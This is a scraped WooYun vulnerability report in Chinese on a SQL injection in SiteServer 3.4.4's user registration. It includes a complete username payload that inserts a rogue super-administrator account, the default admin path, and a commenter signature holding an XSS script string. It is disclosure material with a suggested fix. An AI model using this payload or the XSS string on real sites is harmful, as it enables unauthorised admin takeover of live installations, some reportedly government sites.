{"id": 22058, "wybug_id": "wooyun-2011-03111", "wybug_title": "SiteServer 3.4.4 逻辑漏洞导致SQL注入", "wybug_corp": "北京百容千域软件技术开发有限责任公司", "wybug_author": "蓝孩", "wybug_date": "2011-10-25 15:09", "wybug_open_date": "2011-10-25 15:37", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "注射", "逻辑错误", "设计不当", "后台地址泄露", "后台地址被猜解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-10-25：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2011-10-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： SiteServer 3.4.4 某业务流程逻辑错误，导致SQL注入，从而得到后台管理权限，进而拿到webshell。也可直接利用sqlserver配置不当拿到webshell或服务器权限。 详细说明：  问题出在UserCenter.Pages.DLL中的Register，注册流程逻辑有问题，具体如下：1.程序先把用户名带入数据库中查询，如果用户名没有重复，进入第二步；2.再在远程检测用户名中是否含有非法字符，如果没有，则进入第三步；3.将新注册的用户插入数据库。 由于在进行第一步的时候，程序没有进行任何处理就带入数据库中查询，那么就可以xxoo了。 Orz。。。。 Example:http://127.0.0.1/UserCenter/register.aspx用户名填入以下语句，其他地方正常填写。123');insert into bairong_Administrator([UserName],[Password],[PasswordFormat],[PasswordSalt]) values('blue','VffSUZcBPo4=','Encrypted','i7jq4LwC25wKDoqHErBWaw==');insert into bairong_AdministratorsInRoles values('Administrator','blue');insert into bairong_AdministratorsInRoles values('RegisteredUser','blue');insert into bairong_AdministratorsInRoles values('ConsoleAdministrator','blue');-- 提交注册之后就往库里面插入了一个用户名为：blue 密码为：lanhai 的超级用户。默认后台地址为：http://127.0.0.1/siteserver   漏洞证明：     修复方案：  调整业务流程，先检测非法字符，再带入数据库中查询。   版权声明：转载请注明来源 蓝孩@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：10 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2011-10-27 11:42 |    \t\tcy3ber \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | 11</textarea><script>alert(xss)</script>)\t\t \n  测试成功 危害挺大 许多政府站都用这套系统    \n     2013-01-12 16:26 |    \t\tif、so  \t\t\t( 核心白帽子 |\t\t\t        Rank:1008 漏洞数:91        | 梦想还是要有的，万一实现了呢？)\t\t \n  葫芦娃头像？来乌云了，哈哈,私聊    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 10, "Ranks": null}